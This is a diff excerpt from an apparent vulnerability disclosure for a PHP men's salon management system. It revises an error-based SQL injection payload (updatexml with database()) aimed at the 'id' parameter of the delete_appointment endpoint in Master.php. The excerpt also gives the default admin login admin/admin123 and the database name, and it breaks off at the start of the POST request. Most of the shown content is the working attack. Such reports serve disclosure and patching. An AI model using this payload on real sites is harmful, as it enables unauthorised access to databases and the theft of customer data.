@@ -6,11 +6,13 @@ vendors: https://www.sourcecodester.com/php/15069/simple-online-mens-salon-manag
 
 Login account:admin/admin123
 
+dbname=msms_db
+
 Vulnerability File: /msms/classes/Master.php?f=delete_appointment
 
 Vulnerability location: /msms/classes/Master.php?f=delete_appointment, id
 
-[+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
+[+] Payload: id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)# // Leak place ---> id
 
 ```sql
 POST /msms/classes/Master.php?f=delete_appointment HTTP/1.1
